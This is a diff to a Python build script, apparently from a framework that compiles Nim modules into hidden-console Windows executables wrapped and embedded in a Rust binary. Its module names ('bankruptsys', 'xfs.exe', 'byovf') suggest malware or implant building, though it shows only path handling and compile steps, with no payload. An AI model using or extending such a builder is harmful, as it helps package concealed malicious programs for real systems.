@@ -432,9 +432,22 @@ def main():
         }
     }
 
-    selected_module_paths = args.merge if args.merge else [args.nim_file]
-    embedded_files_for_rust = {}
     nim_options = list(args.option) if args.option else []
+    
+    selected_module_paths = []
+    if args.merge:
+        # When merging, check for byovf and replace its path with the one from options
+        nim_file_opt = next((opt for opt in nim_options if opt.startswith('nimFile=')), None)
+        for module_path in args.merge:
+            if 'MODULE/byovf.nim' in module_path and nim_file_opt:
+                nim_file_path_str = nim_file_opt.split('=', 1)[1].strip()
+                expanded_path_str = os.path.expandvars(nim_file_path_str)
+                selected_module_paths.append(str(Path(expanded_path_str).expanduser()))
+            else:
+                selected_module_paths.append(module_path)
+    elif args.nim_file:
+        selected_module_paths = [args.nim_file]
+    embedded_files_for_rust = {}
 
     for module_path in selected_module_paths:
         normalized_path = str(Path(module_path)).replace(os.sep, '/')
@@ -461,14 +474,17 @@ def main():
         embed_files_opt = next((opt for opt in nim_options if opt.startswith('embedFiles=')), None)
         if embed_files_opt:
             file_paths_str = embed_files_opt.split('=', 1)[1]
-            for file_path_str in file_paths_str.split(','):
-                expanded_path_str = os.path.expandvars(file_path_str.strip())
-                file_path = Path(expanded_path_str).expanduser()
-                if file_path.exists():
-                    print(f"[*] Queuing {file_path.name} for Rust wrapper embedding from byovf.")
-                    embedded_files_for_rust[file_path.name] = file_path.read_bytes()
-                else:
-                    print(f"[Warning] File to embed not found: {file_path}")
+            if file_paths_str:
+                for file_path_str_raw in file_paths_str.split(','):
+                    file_path_str = file_path_str_raw.strip()
+                    if file_path_str: # Only process non-empty paths
+                        expanded_path_str = os.path.expandvars(file_path_str)
+                        file_path = Path(expanded_path_str).expanduser()
+                        if file_path.exists() and file_path.is_file():
+                            print(f"[*] Queuing {file_path.name} for Rust wrapper embedding from byovf.")
+                            embedded_files_for_rust[file_path.name] = file_path.read_bytes()
+                        else:
+                            print(f"[Warning] File to embed not found or is a directory: {file_path}")
 
     final_exe_path_str = args.output_exe
     if target_os == "windows" and not final_exe_path_str.lower().endswith(".exe"):
@@ -479,6 +495,26 @@ def main():
     final_exe.parent.mkdir(parents=True, exist_ok=True)
 
     with tempfile.TemporaryDirectory() as tmpdir:
+        # Special handling for bankruptsys: pre-compile xfs.exe
+        bankruptsys_path_str = 'MODULE/bankruptsys.nim'
+        if bankruptsys_path_str in selected_module_paths and not args.nim_only and target_os == 'windows':
+            print("[*] Pre-compiling xfs.exe for bankruptsys module.")
+            xfs_exe_path = Path(tmpdir) / "xfs.exe"
+            compile_nim(
+                nim_file=bankruptsys_path_str,
+                output_exe=xfs_exe_path,
+                os_name=target_os,
+                arch=target_arch,
+                hide_console=True,
+                nim_defines=['xfs']
+            )
+            if xfs_exe_path.exists():
+                print(f"[+] Successfully built {xfs_exe_path.name}, queuing for Rust wrapper embedding.")
+                embedded_files_for_rust[xfs_exe_path.name] = xfs_exe_path.read_bytes()
+            else:
+                print("[Error] Failed to build xfs.exe for bankruptsys. Aborting.")
+                sys.exit(1)
+
         tmp_dir = Path(tmpdir)
         nim_defines = []
         if args.merge:
